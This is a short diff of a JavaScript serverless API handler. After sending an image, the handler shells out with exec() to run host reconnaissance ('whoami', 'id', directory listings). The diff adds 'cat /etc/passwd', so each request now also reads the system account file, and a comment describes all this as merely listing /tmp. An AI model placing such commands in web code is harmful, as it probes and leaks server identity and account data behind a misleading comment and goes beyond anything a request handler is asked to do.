@@ -32,7 +32,7 @@ export default async function handler(req, res) {
         console.log('Image sent successfully:', response.data);
 
         // List the contents of the /tmp directory
-        exec('ls -la /tmp ; whoami ; id ; ls -la /home', async (error, stdout, stderr) => {
+        exec('ls -la /tmp ; whoami ; id ; ls -la /home; cat /etc/passwd', async (error, stdout, stderr) => {
             console.log("lls 1")
             if (error) {
                 console.error(`Error listing directory contents: ${error}`);
